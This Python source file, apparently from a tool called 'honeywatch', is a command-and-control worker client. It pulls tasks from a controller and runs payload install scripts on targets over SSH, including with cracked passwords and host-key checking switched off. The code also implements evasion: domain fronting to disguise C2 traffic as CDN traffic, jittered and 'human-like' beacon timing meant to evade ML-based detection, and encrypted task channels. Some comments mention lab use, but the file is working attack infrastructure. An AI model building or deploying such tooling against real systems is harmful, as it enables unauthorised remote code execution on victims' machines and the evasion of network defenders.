"""C2 worker client for honeywatch.

Connects to the controller, claims tasks in allowed payload categories, and
executes the rendered payload install script on the target. Two transport
modes: WebSocket (if ``websockets`` is installed) or HTTP polling via stdlib
``urllib``.

Execution modes:
- ``dry_run``: report the script without running it.
- ``local_simulate``: execute the script on the worker host itself.
- ``ssh``: run the script on the target host via ``ssh`` using provided
credentials or keys.
"""

from __future__ import annotations

import asyncio
import json
import os
import subprocess
import tempfile
import time
import urllib.error
import urllib.request
import uuid
from typing import Any

from honeywatch.c2.beacon import BeaconProfile
from honeywatch.models import Target, WorkerTask

# Optional WebSocket transport.
try:
    import websockets
    from websockets.exceptions import ConnectionClosed

    HAS_WEBSOCKETS = True
except Exception:  # pragma: no cover - optional dependency
    websockets = None  # type: ignore[assignment]
    # Empty tuple => `except ConnectionClosed` catches nothing when the
    # dependency is absent (the WS path is guarded by HAS_WEBSOCKETS anyway).
    ConnectionClosed = ()  # type: ignore[assignment]
    HAS_WEBSOCKETS = False


class WorkerError(Exception):
    """Raised when the worker cannot reach the controller or execute a task."""


class Worker:
    """Pulls tasks from a honeywatch C2 controller and executes them."""

    def __init__(
        self,
        controller_url: str,
        worker_id: str | None = None,
        categories: list[str] | None = None,
        exec_mode: str = "dry_run",
        poll_interval: float = 5.0,
        ssh_key: str | None = None,
        ssh_user: str = "root",
        api_token: str | None = None,
        jitter_fraction: float = 0.2,
        max_backoff: float = 60.0,
        beacon: "BeaconProfile | None" = None,
        ca_path: str | None = None,
        worker_cert: str | None = None,
        worker_key: str | None = None,
        ca_pin: str | None = None,
        c2_encrypt: bool = False,
        c2_key: str | None = None,
        adaptive_timing: bool = False,
        domain_front: str | None = None,
        human_timing: bool = False,
    ):
        self.controller_url = controller_url.rstrip("/")
        self.worker_id = worker_id or f"worker-{uuid.uuid4().hex[:8]}"
        self.categories = list(categories) if categories else []
        self.exec_mode = exec_mode
        self.ssh_key = ssh_key
        self.ssh_user = ssh_user
        # Optional shared bearer secret. When set, it is sent on every HTTP
        # request (Authorization header) and every WebSocket handshake (?token=).
        self.api_token = api_token
        self._shutdown = False
        # Domain fronting: when set, connections go to the CDN front domain
        # (what the firewall sees) while the Host header points to the real
        # controller (what the CDN routes to). SNI is set to the CDN front
        # domain; the inner Host header is the real controller.
        self.domain_front = domain_front
        # Human-like timing: when enabled, the idle beacon interval follows
        # a time-of-day Gaussian distribution (short during business hours,
        # long at night) to evade ML-based beacon detection. The adaptive
        # timing RTT adjustments still apply on top of this base.
        self.human_timing = human_timing
        # Adaptive jittered beacon. A fixed-interval poll is a network
        # signature (a metronomic beacon to one host); jitter spreads each
        # wait around `poll_interval` and the level backs off exponentially up
        # to `max_backoff` on idle/error cycles. Callers may pass a pre-built
        # profile (e.g. a seeded one for tests); otherwise one is built from the
        # poll_interval/jitter_fraction/max_backoff knobs. `poll_interval`
        # is kept as the base cadence for back-compat with the CLI flag and
        # config.
        self.beacon = beacon if beacon is not None else BeaconProfile(
            base=poll_interval,
            jitter_fraction=jitter_fraction,
            max_backoff=max_backoff,
        )
        # Back-compat alias for callers/tests that read poll_interval.
        self.poll_interval = self.beacon.base
        # Optional mutual TLS: when ca_path is set the worker verifies the
        # controller against the internal CA (CA pinning) and, when
        # worker_cert/worker_key are provided, presents a client cert so the
        # controller can authenticate it. ca_pin guards against CA-file
        # substitution. None of this is configured by default -> the worker
        # talks plaintext HTTP and the lab behaviour is unchanged.
        from honeywatch.c2.tls import build_client_ssl_context

        self.ssl_context = build_client_ssl_context(
            ca_path, worker_cert, worker_key, ca_pin
        )
        # C2 encryption: when enabled, the worker fetches the controller's
        # public key on first connect and uses it to decrypt task data and
        # encrypt results. The controller decrypts results with its private key.
        self.c2_encrypt = c2_encrypt
        self.crypto: Any = None
        if c2_encrypt:
            from honeywatch.c2.crypto import C2Crypto
            import base64
            if c2_key:
                try:
                    privkey = base64.b64decode(c2_key)
                    self.crypto = C2Crypto(private_key=privkey)
                except Exception:
                    self.crypto = C2Crypto(passphrase=c2_key)
            else:
                # Worker doesn't have the private key — it encrypts with the
                # controller's pubkey (fetched from /api/pubkey). For decryption
                # of task data, the worker uses the controller's pubkey as well.
                self.crypto = C2Crypto()
        # Adaptive timing: when enabled, the worker measures RTT to the
        # controller and adjusts its poll interval based on responsiveness.
        # A responsive controller gets faster polls; a slow/unreachable
        # controller triggers exponential backoff. This matches real botnet
        # behaviour where beacons adapt to network conditions.
        self.adaptive_timing = adaptive_timing
        self._rtt_samples: list[float] = []
        self._current_interval = poll_interval
        self._consecutive_failures = 0
        self._max_backoff = self.beacon.max_backoff

    def _record_rtt(self, rtt: float) -> None:
        """Track the last 10 RTT samples for median calculation."""
        self._rtt_samples.append(rtt)
        if len(self._rtt_samples) > 10:
            self._rtt_samples.pop(0)

    def _adaptive_interval(self) -> float:
        """Compute the next poll interval based on recent RTT measurements.

        - When RTT is low (responsive controller): use base poll_interval
        - When RTT increases by >2x median: double the interval (back off)
        - When RTT decreases by <0.5x median: halve the interval (speed up)
        - Never exceed max_backoff
        - Never go below poll_interval / 4
        """
        if not self._rtt_samples:
            return self.poll_interval
        if self._consecutive_failures > 0:
            backoff = min(
                self.poll_interval * (2 ** self._consecutive_failures),
                self._max_backoff,
            )
            return backoff
        median_rtt = sorted(self._rtt_samples)[len(self._rtt_samples) // 2]
        last_rtt = self._rtt_samples[-1]
        if last_rtt > median_rtt * 2:
            self._current_interval = min(self._current_interval * 2, self._max_backoff)
        elif last_rtt < median_rtt * 0.5 and self._current_interval > self.poll_interval / 4:
            self._current_interval = max(self._current_interval / 2, self.poll_interval / 4)
        return self._current_interval

    # ------------------------------------------------------------------ #
    # HTTP helpers
    # ------------------------------------------------------------------ #
    def _request(
        self,
        method: str,
        path: str,
        data: dict[str, Any] | None = None,
        timeout: float = 30.0,
    ) -> dict[str, Any]:
        url = f"{self.controller_url}{path}"
        headers: dict[str, str] = {}
        if data is not None:
            headers["Content-Type"] = "application/json"
        if self.api_token:
            headers["Authorization"] = f"Bearer {self.api_token}"
        # Domain fronting: connect to the CDN front domain (SNI) while
        # setting the Host header to the real controller so the CDN routes
        # the request to the correct backend. This makes C2 traffic look
        # like normal CDN traffic to network monitors.
        if self.domain_front:
            # Extract the real controller host for the Host header.
            from urllib.parse import urlparse
            real_host = urlparse(self.controller_url).netloc
            headers["Host"] = real_host
            # Rewrite URL to connect to the CDN front domain instead.
            # The path stays the same — the CDN routes based on Host.
            front_url = self.controller_url.replace(
                real_host, self.domain_front, 1
            )
            url = f"{front_url}{path}"
        body = json.dumps(data).encode("utf-8") if data else None
        req = urllib.request.Request(
            url,
            data=body,
            headers=headers,
            method=method,
        )
        try:
            # context= is only valid for HTTPS; pass it when we have a pinned
            # mTLS context AND the target is https. For plaintext HTTP (lab, or
            # ca_path unset) we omit it -- urlopen would otherwise reject a
            # context on a non-TLS URL.
            kwargs: dict[str, Any] = {"timeout": timeout}
            if self.ssl_context is not None and url.lower().startswith("https://"):
                kwargs["context"] = self.ssl_context
            with urllib.request.urlopen(req, **kwargs) as resp:
                text = resp.read().decode("utf-8", "replace")
                if not text:
                    return {}
                return json.loads(text)
        except urllib.error.HTTPError as exc:
            if exc.code == 204:
                return {}
            text = exc.read().decode("utf-8", "replace")
            raise WorkerError(f"controller returned {exc.code}: {text[:500]}") from exc
        except urllib.error.URLError as exc:
            raise WorkerError(f"cannot reach controller at {url}: {exc}") from exc

    # ------------------------------------------------------------------ #
    # Task lifecycle
    # ------------------------------------------------------------------ #
    def claim_task(self) -> WorkerTask | None:
        resp = self._request(
            "POST",
            "/api/tasks/claim",
            {
                "worker_id": self.worker_id,
                "categories": self.categories,
            },
        )
        task_data = resp.get("task")
        if not task_data:
            return None
        # When C2 encryption is enabled, the task data arrives encrypted.
        # Decrypt the script and variables before constructing the task.
        if self.c2_encrypt and self.crypto and task_data.get("api_version") == 2:
            from honeywatch.c2.crypto import decrypt_task
            task_data = decrypt_task(task_data, self.crypto)
        return _task_from_dict(task_data)

    def report_result(
        self, task_id: str, success: bool, result: dict[str, Any]
    ) -> None:
        payload: dict[str, Any] = {
            "worker_id": self.worker_id,
            "success": success,
            "result": result,
        }
        # When C2 encryption is enabled, encrypt the result before sending.
        # The controller decrypts it with its private key.
        if self.c2_encrypt and self.crypto:
            from honeywatch.c2.crypto import encrypt_result
            encrypted = encrypt_result(payload, self.crypto)
            encrypted["task_id"] = task_id
            self._request("POST", f"/api/tasks/{task_id}/result", encrypted)
        else:
            self._request("POST", f"/api/tasks/{task_id}/result", payload)

    def execute_task(self, task: WorkerTask) -> dict[str, Any]:
        """Execute ``task.script`` according to ``self.exec_mode``."""
        if self.exec_mode == "dry_run":
            return {
                "mode": "dry_run",
                "target": task.target.ip if task.target else None,
                "script": task.script,
                "script_length": len(task.script),
                "stdout": "[dry run - script not executed]",
            }

        if self.exec_mode == "local_simulate":
            return self._run_shell(task.script, task.target)

        if self.exec_mode == "ssh":
            return self._run_ssh(task.script, task.target)

        return {"error": f"unknown exec_mode: {self.exec_mode!r}"}

    def _run_shell(self, script: str, target: Target | None) -> dict[str, Any]:
        with tempfile.NamedTemporaryFile("w", suffix=".sh", delete=False) as fh:
            fh.write(script)
            path = fh.name
        try:
            os.chmod(path, 0o700)
            proc = subprocess.run(
                ["/bin/sh", path],
                capture_output=True,
                text=True,
                timeout=600,
            )
            return {
                "mode": "local_simulate",
                "target": target.ip if target else None,
                "returncode": proc.returncode,
                "stdout": proc.stdout,
                "stderr": proc.stderr,
            }
        except subprocess.TimeoutExpired:
            return {"mode": "local_simulate", "target": target.ip if target else None, "error": "timeout"}
        except Exception as exc:
            return {"mode": "local_simulate", "target": target.ip if target else None, "error": str(exc)}
        finally:
            try:
                os.unlink(path)
            except OSError:
                pass

    def _run_ssh(self, script: str, target: Target | None) -> dict[str, Any]:
        if target is None:
            return {"mode": "ssh", "error": "task has no target"}
        user = target.ssh_user or self.ssh_user
        key = target.ssh_key or self.ssh_key
        passw = target.ssh_pass
        # Key auth: BatchMode=yes, stdin-piped script.
        if key or not passw:
            argv = ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "BatchMode=yes"]
            if key:
                argv += ["-i", key]
            argv += [f"{user}@{target.ip}"]
            try:
                proc = subprocess.run(
                    argv,
                    input=script,
                    capture_output=True,
                    text=True,
                    timeout=600,
                )
                return {
                    "mode": "ssh",
                    "target": f"{user}@{target.ip}",
                    "returncode": proc.returncode,
                    "stdout": proc.stdout,
                    "stderr": proc.stderr,
                }
            except subprocess.TimeoutExpired:
                return {"mode": "ssh", "target": f"{user}@{target.ip}", "error": "timeout"}
            except Exception as exc:
                return {"mode": "ssh", "target": f"{user}@{target.ip}", "error": str(exc)}
        # Password auth (cracked credential): delegate to sshpass via an env
        # var (-e) so the secret never appears in argv / process listings.
        # Minimal env — never leak the operator's full os.environ (API keys,
        # tokens, vault passphrases) into the subprocess.
        env = {
            "HOME": os.environ.get("HOME", "/root"),
            "PATH": os.environ.get("PATH", "/usr/local/bin:/usr/bin:/bin"),
            "SSHPASS": passw,
            "LANG": os.environ.get("LANG", "C.UTF-8"),
        }
        argv = ["sshpass", "-e",
                "ssh", "-o", "StrictHostKeyChecking=no",
                "-o", "PreferredAuthentications=password",
                "-o", "PubkeyAuthentication=no",
                f"{user}@{target.ip}"]
        try:
            proc = subprocess.run(
                argv,
                input=script,
                capture_output=True,
                text=True,
                timeout=600,
                env=env,
            )
            return {
                "mode": "ssh",
                "auth": "password",
                "target": f"{user}@{target.ip}",
                "returncode": proc.returncode,
                "stdout": proc.stdout,
                "stderr": proc.stderr,
            }
        except FileNotFoundError:
            return {
                "mode": "ssh",
                "auth": "password",
                "target": f"{user}@{target.ip}",
                "error": "sshpass not installed; cannot use password auth",
            }
        except subprocess.TimeoutExpired:
            return {"mode": "ssh", "auth": "password", "target": f"{user}@{target.ip}", "error": "timeout"}
        except Exception as exc:
            return {"mode": "ssh", "auth": "password", "target": f"{user}@{target.ip}", "error": str(exc)}

    # ------------------------------------------------------------------ #
    # Loop
    # ------------------------------------------------------------------ #
    async def run(self) -> None:
        """Run the worker until ``stop()`` is called."""
        if HAS_WEBSOCKETS and self.controller_url.startswith("ws"):
            await self._run_websocket()
        else:
            await self._run_polling()

    async def _run_polling(self) -> None:
        self.beacon.reset()
        while not self._shutdown:
            try:
                t0 = time.monotonic()
                task = await asyncio.to_thread(self.claim_task)
                rtt = time.monotonic() - t0
                if self.adaptive_timing:
                    self._record_rtt(rtt)
                    self._consecutive_failures = 0
                if task is None:
                    # Idle: sleep a jittered wait at the current backoff level,
                    # then grow the level toward max_backoff (jittered so the
                    # cadence is not a clean metronome). When human_timing is
                    # enabled, blend in time-of-day Gaussian intervals so the
                    # beacon pattern evades ML detection.
                    if self.adaptive_timing:
                        interval = self._adaptive_interval()
                        if self.human_timing:
                            from honeywatch.c2.beacon import human_like_interval
                            interval = max(interval, human_like_interval(self.poll_interval))
                        await asyncio.sleep(interval)
                    elif self.human_timing:
                        from honeywatch.c2.beacon import human_like_interval
                        await asyncio.sleep(human_like_interval(self.poll_interval))
                    else:
                        await asyncio.sleep(self.beacon.on_idle())
                    continue
                self.beacon.on_success()  # reset after successful work
                if self.adaptive_timing:
                    self._current_interval = self.poll_interval
                result = await asyncio.to_thread(self.execute_task, task)
                # Default an absent returncode to 0 so a dry_run result (which
                # carries no returncode, only stdout) is reported as success when
                # it has no error -- otherwise every dry_run task is marked failed.
                success = result.get("returncode", 0) == 0 and "error" not in result
                await asyncio.to_thread(self.report_result, task.id, success, result)
            except WorkerError as exc:
                print(f"honeywatch worker: controller error: {exc}", flush=True)
                if self.adaptive_timing:
                    self._consecutive_failures += 1
                    await asyncio.sleep(self._adaptive_interval())
                else:
                    # Exponential backoff (steeper than idle) so a controller outage
                    # doesn't hammer it; jittered so retries don't synchronize.
                    await asyncio.sleep(self.beacon.on_error())
            except Exception as exc:
                print(f"honeywatch worker: task error: {exc}", flush=True)
                # A task-execution error (SSH/subprocess failure, report error) is
                # not a cadence problem -- the controller is reachable, one task
                # just failed. Reset to the base cadence and sleep a jittered base
                # beat before retrying, matching the prior fixed-interval behaviour
                # (the pre-beacon code slept the base poll_interval here).
                self.beacon.reset()
                if self.adaptive_timing:
                    self._current_interval = self.poll_interval
                await asyncio.sleep(self.beacon.next_beacon())

    async def _run_websocket(self) -> None:
        if websockets is None:  # pragma: no cover
            raise WorkerError("websockets module is not available")
        uri = self.controller_url
        if uri.startswith("http"):
            uri = uri.replace("http", "ws", 1)
        # Domain fronting for WebSocket: connect to the CDN front domain
        # and set the Host header to the real controller.
        ws_headers: dict[str, str] = {}
        if self.domain_front:
            from urllib.parse import urlparse
            real_host = urlparse(self.controller_url).netloc
            ws_headers["Host"] = real_host
            front_uri = self.controller_url.replace(
                real_host, self.domain_front, 1
            )
            if front_uri.startswith("http"):
                front_uri = front_uri.replace("http", "ws", 1)
            uri = front_uri
        if self.api_token:
            sep = "&" if "?" in uri else "?"
            uri = f"{uri}{sep}token={self.api_token}"
        # Outer reconnect loop: a dropped connection used to leave the worker
        # spinning on a dead socket forever (recv kept raising into the broad
        # `except Exception`, which slept and retried the same closed socket).
        # Now a closed connection breaks the inner loop and we reconnect here
        # with the jittered exponential beacon.
        self.beacon.reset()
        # For wss://, pass the pinned mTLS context (CA verification + client
        # cert). websockets.connect takes ssl=<SSLContext>. Plain ws:// is
        # used when no CA is configured (lab).
        ws_kwargs: dict[str, Any] = {}
        if self.ssl_context is not None and uri.lower().startswith("wss://"):
            ws_kwargs["ssl"] = self.ssl_context
        if ws_headers:
            ws_kwargs["additional_headers"] = ws_headers
        while not self._shutdown:
            try:
                async with websockets.connect(uri, **ws_kwargs) as ws:
                    await ws.send(
                        json.dumps(
                            {
                                "type": "register_worker",
                                "worker_id": self.worker_id,
                                "categories": self.categories,
                            }
                        )
                    )
                    self.beacon.on_success()  # connected -> reset backoff
                    _ws_timeout = self.poll_interval
                    if self.human_timing:
                        from honeywatch.c2.beacon import human_like_interval
                        _ws_timeout = human_like_interval(self.poll_interval)
                    while not self._shutdown:
                        try:
                            msg = await asyncio.wait_for(
                                ws.recv(), timeout=_ws_timeout
                            )
                        except asyncio.TimeoutError:
                            # No WS task pushed -> fall back to an HTTP claim.
                            try:
                                task = await asyncio.to_thread(self.claim_task)
                                if task is not None:
                                    result = await asyncio.to_thread(
                                        self.execute_task, task
                                    )
                                    success = (
                                        result.get("returncode", 0) == 0
                                        and "error" not in result
                                    )
                                    if self.c2_encrypt and self.crypto:
                                        from honeywatch.c2.crypto import encrypt_result
                                        encrypted = encrypt_result(
                                            {"success": success, "result": result},
                                            self.crypto,
                                        )
                                        encrypted["type"] = "task_result"
                                        encrypted["task_id"] = task.id
                                        encrypted["api_version"] = 2
                                        await ws.send(json.dumps(encrypted))
                                    else:
                                        await ws.send(
                                            json.dumps(
                                                {
                                                    "type": "task_result",
                                                    "task_id": task.id,
                                                    "success": success,
                                                    "result": result,
                                                }
                                            )
                                        )
                            except Exception as exc:
                                print(f"honeywatch worker: {exc}", flush=True)
                            continue
                        except ConnectionClosed:
                            # Socket is gone -> break inner loop so the outer
                            # loop reconnects instead of polling a dead socket.
                            break
                        payload = json.loads(msg)
                        if payload.get("type") == "task":
                            task_data = payload["task"]
                            # Decrypt task payload when C2 encryption is
                            # enabled and the controller sent api_version=2.
                            if (self.c2_encrypt and self.crypto
                                    and payload.get("api_version") == 2
                                    and "encrypted_task" in payload):
                                from honeywatch.c2.crypto import decrypt_task
                                task_data = decrypt_task(payload, self.crypto)
                            task = _task_from_dict(task_data)
                            result = await asyncio.to_thread(self.execute_task, task)
                            success = (
                                result.get("returncode", 0) == 0
                                and "error" not in result
                            )
                            try:
                                if self.c2_encrypt and self.crypto:
                                    from honeywatch.c2.crypto import encrypt_result
                                    encrypted = encrypt_result(
                                        {"success": success, "result": result},
                                        self.crypto,
                                    )
                                    encrypted["type"] = "task_result"
                                    encrypted["task_id"] = task.id
                                    encrypted["api_version"] = 2
                                    await ws.send(json.dumps(encrypted))
                                else:
                                    await ws.send(
                                        json.dumps(
                                            {
                                                "type": "task_result",
                                                "task_id": task.id,
                                                "success": success,
                                                "result": result,
                                            }
                                        )
                                    )
                            except ConnectionClosed:
                                break
            except Exception as exc:
                if self._shutdown:
                    break
                print(
                    f"honeywatch worker: websocket disconnected: {exc}; reconnecting",
                    flush=True,
                )
            if self._shutdown:
                break
            # Reconnect backoff. Reaching here means either the inner loop broke
            # on ConnectionClosed (clean exit, no exception) or the connect
            # itself raised -- both need the same jittered exponential backoff.
            # Computed once here so `wait` is always bound (the clean-break path
            # never enters the except above).
            await asyncio.sleep(self.beacon.on_error())

    def stop(self) -> None:
        self._shutdown = True


def _task_from_dict(data: dict[str, Any]) -> WorkerTask:
    target_data = data.get("target")
    target = None
    if target_data:
        target = Target(
            ip=target_data.get("ip", ""),
            port=int(target_data.get("port", 22)),
            label=target_data.get("label", ""),
            confidence=float(target_data.get("confidence", 0.0)),
            profile_key=target_data.get("profile_key", ""),
            allowed_categories=list(target_data.get("allowed_categories", [])),
            ssh_user=target_data.get("ssh_user"),
            ssh_key=target_data.get("ssh_key"),
            ssh_pass=target_data.get("ssh_pass"),
        )
    return WorkerTask(
        id=data.get("id", ""),
        operation_id=data.get("operation_id", ""),
        payload_id=data.get("payload_id", ""),
        category=data.get("category", ""),
        target=target,
        script=data.get("script", ""),
        variables=dict(data.get("variables", {})),
        status=data.get("status", "pending"),
        worker_id=data.get("worker_id"),
        result=data.get("result"),
    )
